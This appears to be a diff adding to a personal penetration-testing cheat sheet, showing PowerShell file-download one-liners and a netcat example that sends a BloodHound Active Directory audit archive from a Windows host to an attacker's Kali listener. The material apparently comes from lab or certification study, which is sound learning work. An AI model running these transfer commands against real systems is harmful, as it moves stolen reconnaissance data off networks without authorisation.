@@ -1,6 +1,30 @@
 -------------------------------
 PowerShell
 
+- DOWNLOAD FILE:
+
+
 Invoke-WebRequest//iwr//wget -Uri <URI> -OutFile "<BINPATH>"
 
 $webClient = [System.Net.WebClient]::new();$webClient.DownloadFile("<URI>", "<BINPATH>")
+
+
+----------------------------------
+Batch
+
+- TRANSFER/DOWNLOAD:
+
+We can download netcat ($ locate nc.exe in our Kali machine) to our Windows machine and once there perform a transfer file:
+
+
+.\nc.exe <localip> <localport> < <inputfile>
+
+nc -lvp <localip> > <outputfile>
+
+
+For example; from the Windows host to our kali machine:
+
+.\nc.exe 192.168.45.249 4445 < audit_20230905093345_BloodHound.zip
+
+nc -lvp 4445 > audit_beyond_clientwk1.zip
+
